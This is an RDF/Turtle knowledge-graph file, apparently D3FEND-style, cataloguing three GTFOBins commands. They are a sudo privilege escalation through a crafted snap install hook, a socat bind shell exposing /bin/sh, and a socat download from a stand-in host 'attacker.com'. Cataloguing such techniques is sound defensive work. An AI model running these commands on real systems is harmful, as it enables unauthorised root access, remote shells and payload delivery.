mknd:command_snap-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "snap-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description """It runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
COMMAND=id
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```
""" ;
    d3f:uses mknd:executable_snap ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_snap ;
    mknd:provides mknd:function_sudo ;
    mknd:value """sudo snap install xxxx_1.0_all.snap --dangerous --devmode
""" .

mknd:command_socat-bind-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "socat-bind-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run ``socat FILE:`tty`,raw,echo=0 TCP:target.com:12345`` on the attacker box to connect to the shell." ;
    d3f:uses mknd:executable_socat ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_socat ;
    mknd:provides mknd:function_bind-shell ;
    mknd:value """LPORT=12345
socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
""" .

mknd:command_socat-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "socat-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file." ;
    d3f:uses mknd:executable_socat ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_socat ;
    mknd:provides mknd:function_file-download ;
    mknd:value """RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
""" .

